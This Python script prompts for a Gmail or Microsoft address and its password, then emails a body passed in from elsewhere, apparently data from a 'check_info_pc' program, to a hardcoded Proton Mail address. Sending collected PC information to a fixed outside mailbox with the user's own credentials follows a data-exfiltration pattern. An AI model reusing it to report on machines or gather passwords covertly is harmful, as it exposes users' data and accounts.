import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import getpass  # Import the getpass module

def send_email(sender_email,server_address, password, receiver_email, subject, body):
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP(server_address, 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully!")
    except smtplib.SMTPException as e:
        print(f"Failed to send email: {e}")
            
# Example usage
def content_email(body):
    server_address = None # Initialize the server address
    while True:
        sender_email = input("Enter your email address: ")
        domain = sender_email.split('@')[-1]  # Get the domain part of the email
        main_domain = domain.split('.')[-2] if '.' in domain else domain  # Attempt to isolate the main domain part

        # Check if the main domain part matches any of the known services, ignoring extensions
        if main_domain in ['outlook', 'microsoft', 'hotmail', 'live', 'msn']:
            server_address = 'smtp.office365.com'
            break
        elif main_domain == 'gmail':
            server_address = 'smtp.gmail.com'
            break
        else:
            print("Please enter a Microsoft or Google email address.")

    password = getpass.getpass("Enter your email password: ")  
    receiver_email = "jojotestsafe@proton.me"
    subject = "Info sent from my check_info_pc program"
    send_email(sender_email, server_address, password, receiver_email, subject, body)

